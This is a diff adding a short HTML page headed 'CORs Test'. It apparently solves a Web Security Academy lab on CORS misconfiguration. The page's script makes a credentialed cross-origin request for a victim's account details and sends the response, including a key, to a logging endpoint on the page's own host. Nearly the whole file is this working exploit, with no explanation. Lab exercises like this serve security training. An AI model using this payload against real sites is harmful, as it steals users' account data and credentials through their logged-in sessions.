@@ -1,0 +1,18 @@
+<html>
+<head>
+<script>
+   var req = new XMLHttpRequest();
+   req.onload = reqListener;
+   req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
+   req.withCredentials = true;
+   req.send();
+
+   function reqListener() {
+       location='/log?key='+this.responseText;
+   };
+</script>
+</head>
+<body>
+
+<h1>hello this is CORs Test</h1>
+</body>
